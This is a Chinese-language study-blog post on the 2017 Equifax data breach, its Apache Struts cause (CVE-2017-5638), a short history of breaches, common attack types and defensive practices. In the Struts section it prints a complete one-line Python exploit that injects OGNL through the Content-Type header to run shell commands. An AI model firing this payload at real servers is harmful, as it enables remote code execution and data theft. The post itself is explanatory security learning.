---
layout: post
title: "【60天重学左耳】Day58-从Equifax信息泄露看数据安全"
date: 2020-02-11 20:30:00 +0800
categories: code
tags: [Method, Tech]
author: 方伟
---

**从美国知名征信公司Equifax出现的大规模数据泄露事件说起，分析背后的原因，给出解决这类安全问题的技术手段和方法。**

<!--more-->

打卡Day58：今天学习了《03｜Equifax信息泄露始末》和《04｜从Equifax信息泄露看数据安全》，我的收获如下：

2017年9月，美国知名征信公司Equifax出现了大规模数据泄露事件，致使1.43亿用户受到影响。

## Equifax信息泄露始末

黑客利用了其系统中未修复的Apache Struts漏洞（CVE-2017-5638，2017年3月6日曝光）来发起攻击。

该漏洞于2017年3月披露，危险系数定为最高分10分，Apache随后发布的Struts 2.3.32和2.5.10.1版本进行了修复。而Equifax在漏洞公布后的两个月内都没有升级Struts版本，导致5月份黑客利用这个漏洞进行攻击，泄露其敏感数据。

Equifax的一个管理面板使用的用户名和密码都是“admin”。

## Apache Struts 漏洞相关

世界上最流行的Java Web服务器框架之一。采用Java Servlet/JSP技术，实现了基于Java EE Web应用的MVC设计模式的应用框架。

2004年3月成为Apache基金会的顶级项目。2006年，另一个MVC框架WebWork与Struts进行了整合，发布了Struts 2。

中国的Struts应用分布在全球范围内排名第一，第二是美国，然后是日本。

CVE-2017-5638，一个RCE的远程代码执行漏洞，最初被安恒信息的Nike Zheng发现，并于2017年3月7日上报。攻击者可以在使用插件Jakarta Multipart parser上传文件时，修改HTTP请求头中的Content-Type值来触发漏洞，远程执行代码。

就是在Content-Type注入OGNL语言，进而执行命令。代码如下（一行Python命令就可以执行服务器上的shell命令）：

```
import requests
requests.get("https://target", headers={"Connection": "close", "Accept": "*/*", "User-Agent": "Mozilla/5.0", "Content-Type": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='dir').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"})
```

注入点是在 JakartaMultiPartRequest.java的buildErrorMessage函数中，这个函数里的 localizedTextUtil.findText会执行OGNL表达式，从而导致命令执行。

## 数据泄露介绍以及历史回顾

* 2014年，雅虎遭遇攻击，泄露出5亿用户的密码。
* 2012年，LinkedIn泄露了6500万用户名和密码。
* 2014年，携程网安全支付日志存在漏洞，导致大量用户信息如姓名、身份证号、银行卡类别、银行卡号、银行卡CVV码等信息泄露。
* 2011年，RSA公司被钓鱼邮件攻击。打开带有恶意代码的Excel附件，通过攻破Adobe Flash漏洞，来取得对机器的管理权，并访问RSA内网中的服务器。最终导致其母公司EMC花费6630万美元来调查、加固系统，并最终召回和重新分发了30000家企业客户的SecurID卡片。

## 数据泄露攻击

攻击是怎样实现的：

1. 利用程序框架或库的已知漏洞。比如Equifax被攻击，Apache Struts漏洞。RSA被攻击，Adobe Flash漏洞。“心脏流血”，OpenSSL漏洞。
2. 暴力破解密码。利用密码字典库或是已经泄露的密码来“撞库”。
3. 代码注入。SQL注入、XSS攻击、CSRF攻击。
4. 利用程序日志不小心泄露的信息。
5. 社会工程学。安全意识增强了，才能抵御此类攻击。钓鱼攻击。

数据管理上的问题：

1. 只有一层安全。
2. 弱密码。
3. 向公网暴露了内部系统。
4. 对系统及时打安全补丁。
5. 安全日志被暴露。
6. 保存了不必要保存的用户数据。
7. 密码没有被合理地散列。

## 专家建议

5条最佳实践。

1. 跟踪软件使用的框架和库，版本号、最新安全性声明。
2. 建立一个安全补丁快速发布流程。
3. 所有复杂的软件都有漏洞。
4. 建立多个安全层。
5. 针对公网资源，建立对异常访问模式的监控机制。

## 技术上的安全做法

1. 定义出关键数据，隔离到安全级别非常高的地方。
2. 返回脱敏数据，在传输层上加密。
3. 被加密的数据和用于加密的密钥由不同的人来管理。
4. 密钥随机生成，不同用户的数据有不同的密钥，时不时自动化更新。
5. 关键信息传到外部系统，需要通知用户和管理员。超过限制访问量后，报警或拒绝。

**安全方案就是能够把这个风险控制在一个很小的范围。**通过“风控基金”来做业务上的补偿，比如赔偿用户损失。防范成本远高于赔偿成本，还不如赔偿。


> [左耳朵耗子带你重学《左耳听风》](https://time.geekbang.org/column/article/177414)

> [https://time.geekbang.org/column/article/281](https://time.geekbang.org/column/article/281)

> [https://time.geekbang.org/column/article/285](https://time.geekbang.org/column/article/285)



